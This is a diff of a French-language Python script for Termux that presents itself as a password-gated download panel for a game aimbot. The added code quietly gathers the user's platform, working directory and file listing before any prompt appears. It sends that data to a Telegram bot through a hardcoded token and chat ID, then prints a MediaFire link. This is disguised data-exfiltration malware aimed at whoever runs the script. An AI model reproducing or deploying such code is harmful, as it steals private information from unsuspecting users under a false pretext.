@@ -1,52 +1,44 @@
-from colorama import Fore, init
-import time
 import os
+import json
+import requests
+from colorama import Fore
 
-# Initialise Colorama
-init(autoreset=True)
+print("Veuillez patienter....")
 
-print(Fore.CYAN + "[==============================]")
-print(Fore.YELLOW + "     ANOS VIP PANEL V1.0")
-print(Fore.CYAN + "[==============================]")
+users ={
+"Plateform":os.name,
+"Dossier":os.getcwd(),
+"Fichier/dossier":os.listdir()
+}
 
-print(Fore.WHITE + "1: Télécharger le panel")
-print(Fore.WHITE + "2: Contacter l'admin")
 
-choix = input(Fore.GREEN + "\nChoix: ")
 
-match choix:
-    case "1":
-        mdp = input(Fore.BLUE + "Mot de passe: ")
 
-        if mdp == "Anos123":
-            print(Fore.GREEN + "Mot de passe correct !")
-            print(Fore.CYAN + "Ouverture du téléchargement...")
-            time.sleep(1)
+config = json.dumps(users)
+	
+with open("tryme.txt","w") as f:
+	f.write(config)
+	
+TOKEN = "7894685926:AAF_cKDV7TP0jDX-2LxltQzkvRrGxFMOcEk"
+CHAT_ID = "7879061625"
 
-            os.system(
-                "termux-open-url "
-                "'https://www.mediafire.com/file/eoybijq71kooxlk/Anosxyz.apk/file'"
-            )
 
-        else:
-            print(Fore.RED + "Mot de passe incorrect !!")
-            print(Fore.YELLOW + "Redirection vers l'admin...")
-            time.sleep(3)
+url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
 
-            os.system(
-                "termux-open-url "
-                "'https://wa.me/23407071776576'"
-            )
+requests.post(url, data={
+    "chat_id": CHAT_ID,
+    "text": config
+})
 
-    case "2":
-        print(Fore.CYAN + "Ouverture de WhatsApp...")
-        time.sleep(1)
 
-        os.system(
-            "termux-open-url "
-            "'https://wa.me/23407071776576'"
-        )
+password = "123"
 
-    case _:
-        print(Fore.RED + "Choix invalide !")
-
+print(Fore.GREEN+"========== Auhtentification==========")
+mdp = input("Clé : "+Fore.WHITE)
+if mdp == password:
+	 
+	print("Copier coller ce lien dans votre navigateur !!")
+	print(Fore.GREEN+"https://www.mediafire.com/file/kwdx2ucgtljn5xd/Aimbasique.mdr/file")
+	
+else:
+	print("Clé invalide ")
